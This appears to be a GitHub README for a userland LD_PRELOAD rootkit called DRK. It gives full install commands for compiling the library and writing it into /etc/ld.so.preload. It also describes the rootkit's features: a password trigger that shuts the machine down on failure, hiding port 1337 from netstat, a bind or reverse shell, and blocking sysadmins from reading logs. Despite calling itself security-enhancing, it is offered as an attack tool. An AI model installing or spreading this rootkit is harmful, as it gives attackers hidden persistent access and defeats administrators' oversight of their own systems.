## Introduction

Welcome to my rootkit userland This toolkit offers some cool and interesting functionalities designed to enhance your digital security. Let's dive into what it can do.





https://github.com/DARKSECshell/ROOTKIT-USERLAND/assets/121623691/0ce59ac5-a30c-4c20-b7a7-33c25c54cced





## INSTALL MANUAL

1) *git clone*:
```
git clone https://github.com/DARKSECshell/ROOTKIT-USERLAND
```

2) *userland rootkit compilation*
```
gcc DRK.c -o DRK.so -shared -fPIC -ldl
```

3) *moved library for /etc/ld.so.preload*
```
echo "$(pwd)/DRK.so" > /etc/ld.so.preload && ldconfig
```

4) *Check rk loading*
```
ldd /usr/bin/ls
```


## Functionality Overview

When the digital attacker issues the command to kill port 1337, an interesting sequence of events unfolds:

1. **Password Prompt**: Upon attempting to kill port 1337, the rootkit will prompt for a password.
   
2. **Password Verification**: If the provided password matches the expected one, the rootkit will proceed to the next step.
   
3. **Incorrect Password Handling**: If the password provided does not match the expected one, the machine will initiate a shutdown process.

But what happens if the correct password is entered?

4. **Port 1337 Hiding**: The rootkit will stealthily hide port 1337 from detection. Even tools like `netstat` (and possibly `ss` in the future) will be deceived.

5. **Bind Shell Activation**: Additionally, the rootkit will activate a bind shell on the local machine. While firewalls may attempt to block it, the user will have the option to choose between a reverse shell or a bind shell.

6. **Log Concealment**: The rootkit ensures that commands like `tail` will have no effect. Sysadmins won't be able to spot suspicious activity in logs, nor will they be able to use other tools to inspect them.

7. **Future Plans**: Looking ahead, I'm considering further enhancements to make the rootkit even more stealthy. For instance, I'm contemplating hiding `/etc/ld.so.preload` to minimize suspicion from sysadmins.
